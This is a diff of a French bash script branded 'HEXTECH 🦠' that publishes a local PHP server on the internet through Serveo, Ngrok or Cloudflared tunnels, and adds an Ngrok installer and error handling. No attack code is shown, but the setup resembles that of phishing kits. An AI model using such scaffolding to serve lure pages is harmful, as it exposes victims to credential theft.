@@ -11,25 +11,61 @@ demarrer_serveur_php() {
     sleep 2 # Attendre que le serveur démarre
 }
 
-# Fonction pour générer un lien avec Serveo
-generer_lien_serveo() {
-    echo -e "${JAUNE}HEXTECH 🦠 [*] Connexion à Serveo pour générer un lien public...${NC}"
-    ssh -R 80:localhost:3000 serveo.net -p 22 2>/dev/null || {
-        echo -e "${ROUGE}[!] Échec de la connexion à Serveo.${NC}"
-    }
+# Fonction pour télécharger et installer Ngrok
+installer_ngrok() {
+    echo -e "${JAUNE}[•] Téléchargement de Ngrok...${NC}"
+
+    # Détecter l'architecture de l'appareil (ARM/ARM64/amd64)
+    arch=$(uname -m)
+    if [ "$arch" == "aarch64" ]; then
+        ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-arm64.tgz"
+    elif [ "$arch" == "armv7l" ] || [ "$arch" == "arm" ]; then
+        ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-arm.tgz"
+    else
+        ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.tgz"
+    fi
+
+    # Télécharger Ngrok
+    if wget -O ngrok.tgz "$ngrok_url"; then
+        echo -e "${BLEU}[✓] Ngrok téléchargé avec succès.${NC}"
+    else
+        echo -e "${ROUGE}[!] Échec du téléchargement de Ngrok. Vérifiez votre connexion internet.${NC}"
+        exit 1
+    fi
+
+    # Extraire et déplacer Ngrok
+    if tar -xvzf ngrok.tgz; then
+        mv ngrok /usr/local/bin/ || {
+            echo -e "${ROUGE}[!] Impossible de déplacer Ngrok vers /usr/local/bin.${NC}"
+            exit 1
+        }
+        rm ngrok.tgz
+        echo -e "${BLEU}[✓] Ngrok installé avec succès.${NC}"
+    else
+        echo -e "${ROUGE}[!] Échec de l'extraction de Ngrok. Vérifiez le fichier téléchargé.${NC}"
+        rm ngrok.tgz
+        exit 1
+    fi
 }
 
 # Fonction pour générer un lien avec Ngrok
 generer_lien_ngrok() {
     echo -e "${JAUNE}[•] Démarrage de Ngrok...${NC}"
     if ! command -v ngrok &> /dev/null; then
-        echo -e "${ROUGE}[!] Ngrok n'est pas installé. Installation en cours...${NC}"
-        pkg install wget -y
-        wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-arm.zip
-        unzip ngrok-stable-linux-arm.zip
-        mv ngrok /usr/local/bin/
+        installer_ngrok
     fi
-    ngrok http 3000
+    ngrok http 3000 || {
+        echo -e "${ROUGE}[!] Une erreur s'est produite lors du lancement de Ngrok.${NC}"
+        exit 1
+    }
+}
+
+# Fonction pour générer un lien avec Serveo
+generer_lien_serveo() {
+    echo -e "${JAUNE}HEXTECH 🦠 [*] Connexion à Serveo pour générer un lien public...${NC}"
+    ssh -R 80:localhost:3000 serveo.net -p 22 || {
+        echo -e "${ROUGE}[!] Échec de la connexion à Serveo. Vérifiez votre connexion internet.${NC}"
+    }
 }
 
 # Fonction pour générer un lien avec une méthode alternative (Cloudflared)
@@ -39,7 +75,10 @@ generer_lien_autre() {
         echo -e "${ROUGE}[!] Cloudflared n'est pas installé. Installation en cours...${NC}"
         pkg install cloudflared -y
     fi
-    cloudflared tunnel --url http://localhost:3000
+    cloudflared tunnel --url http://localhost:3000 || {
+        echo -e "${ROUGE}[!] Une erreur s'est produite lors du lancement de Cloudflared.${NC}"
+        exit 1
+    }
 }
 
 # Vérification si SSH et PHP sont installés
